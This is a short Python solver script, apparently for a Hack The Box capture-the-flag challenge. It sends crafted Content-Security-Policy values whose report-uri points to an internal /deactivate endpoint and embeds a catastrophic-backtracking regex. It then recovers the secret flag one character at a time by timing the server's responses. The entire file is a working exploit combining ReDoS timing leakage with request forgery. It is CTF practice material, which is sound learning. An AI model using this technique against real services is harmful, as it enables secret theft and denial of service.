#!/usr/bin/env python3
import requests
from string import ascii_letters, digits

def makeRequest(flag):
    hostURL = "http://127.0.0.1:1337"   # Change to live version

    url = f"{hostURL}/api/evaluate"
    payload = f"^(?={flag})(((([a-zA-Z0-9{{_]%2B)*)*)*)$"
    headers = {"Content-Type": "application/json"}

    json={"csp": f"img-src https: data:;foobar-src 'foobar';report-uri http://127.0.1:1337/deactivate?secretCode={payload};"}
    r = requests.post(url, headers=headers, json=json)
    return r

def get_flag():
    flag = 'HTB{'
    dictionary = ascii_letters + digits + '_!}'
    while flag[-1] != '}':
        for char in dictionary:
            r = makeRequest(flag+char)
            time = r.elapsed.total_seconds()
            if time > 2:
                flag += char
                break
    print(flag)


get_flag()